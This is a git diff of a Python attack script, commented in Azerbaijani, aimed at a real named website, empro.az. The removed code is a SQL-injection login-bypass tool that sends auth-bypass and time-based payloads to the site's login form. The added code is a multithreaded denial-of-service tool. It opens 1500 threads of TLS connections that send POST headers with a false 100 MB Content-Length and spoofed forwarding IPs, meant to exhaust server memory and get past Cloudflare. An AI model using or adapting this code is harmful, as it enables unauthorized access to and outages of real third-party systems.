@@ -1,58 +1,82 @@
-import asyncio
-import httpx
+import socket
+import ssl
+import threading
+import random
 import time
+import os
 
-TARGET_URL = "https://empro.az/login" # Login qapısı
+# ==========================================
+# 🎯 HƏDƏFİ BURADA DƏYİŞ (Target Host)
+TARGET_HOST = "empro.az" 
+TARGET_PORT = 443
+# ==========================================
 
-# SQL mühərrikini aldatmaq üçün universal 'bypass' kodları
-SQL_PAYLOADS = [
-    "' OR 1=1 --",
-    "admin' --",
-    "admin' #",
-    "' or '1'='1",
-    "admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--" 
-]
+THREADS = 1500 # Railway Paid üçün maksimal şəbəkə sıxlığı
 
-async def inject(payload, client):
-    # Saytın daxili form adlarını (email/password) təxmin edirik
-    data = {
-        "email": payload, 
-        "password": "wrong_password",
-        "submit": "1"
-    }
-    
-    try:
-        start_time = time.time()
-        response = await client.post(TARGET_URL, data=data, timeout=20)
-        end_time = time.time()
-        
-        # 1. Metod: Time-based (Əgər server 5 saniyədən gec cavab verirsə, bu SQLi-dir)
-        if (end_time - start_time) >= 5:
-             print(f"🔥 [CRITICAL] SQLi TAPILDI (Time-Based): {payload}")
-             print("🚩 Serverin beyni donduruldu, məlumatları çəkə bilərik!")
-             return True
-             
-        # 2. Metod: Error-based / Boolean
-        # Əgər 'şifrə səhvdir' yazısı yox olursa, deməli içəridəyik
-        if response.status_code == 302 or "dashboard" in response.text.lower():
-            print(f"✅ [SUCCESS] AUTH BYPASS UĞURLU: {payload}")
-            print(f"🔗 Daxil olmaq üçün bu kodu istifadəçi adı yerinə yazın!")
-            return True
+def r_str(n=30):
+    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
+
+def internal_corruption():
+    # SSL Handshake motorunu rəsmi dövlət qurumları kimi (JA3) təqlid edirik
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    # Şifrələməni serverin daxili prosessorunu ən çox yoran üsulda saxlayırıq (CPU Killer)
+    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')
+
+    while True:
+        try:
+            # TCP bağlantısı - Paket gecikməsini (Nagle) bypass edirik
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.settimeout(5)
+
+            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
+            conn.connect((TARGET_HOST, TARGET_PORT))
+
+            # --- SİR BURADADIR (SLOW-WRITE BUFFER EXPLOIT) ---
+            # Serverə yalan deyirik: 100 MB data göndəririk (Content-Length)
+            # Bu, serverin daxili RAM-ını kilitləmək üçün 'Genocide' metodudur.
+            for _ in range(500):
+                path = f"/?v={time.time()}&id={r_str(40)}&q={r_str(80)}"
+                ip = f"{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+                
+                # Malformed Header Strike: Cloudflare analitikasını donduran başlıqlar
+                header = (
+                    f"POST {path} HTTP/1.1\r\n"
+                    f"Host: {TARGET_HOST}\r\n"
+                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15\r\n"
+                    f"X-Forwarded-For: {ip}\r\n"
+                    f"Content-Type: application/x-www-form-urlencoded\r\n"
+                    f"Content-Length: 104857600\r\n" # 100 Megabyte "Yalançı" yük
+                    f"Connection: Keep-Alive\r\n"
+                    f"\r\n"
+                ).encode()
+
+                conn.sendall(header)
+                # Serveri asılı saxlamaq üçün yarımçıq paketlər
+                conn.send(os.urandom(1)) 
             
-    except Exception:
-        pass
-    return False
+            # Bağlantını bağlamırıq, port port kilitləyirik
+            time.sleep(2)
+            conn.close()
+        except:
+            pass
 
-async def main():
-    print(f"🕵️  ADVANCED LOGIN BYPASS BAŞLADI: {TARGET_URL}")
-    print("[*] SQL Injection vektorları yoxlanılır...\n")
+def main():
+    print(f"☢️  INTERNAL CORRUPTION ACTIVATED: {TARGET_HOST}")
+    print("[!] Target Protocol Layer: Shredding SSL Buffer & Memory Table...")
     
-    async with httpx.AsyncClient(verify=False) as client:
-        for p in SQL_PAYLOADS:
-            if await inject(p, client):
-                print("\n[!] SIZMA TAMAMLANDI! Admin panelinə giriş açıldı.")
-                break
-            await asyncio.sleep(1)
+    for i in range(THREADS):
+        t = threading.Thread(target=internal_corruption)
+        t.daemon = True
+        t.start()
+        if i % 100 == 0:
+            print(f"[*] Warhead {i} deployed into Core Memory...")
+            time.sleep(0.1)
+
+    while True:
+        time.sleep(1)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
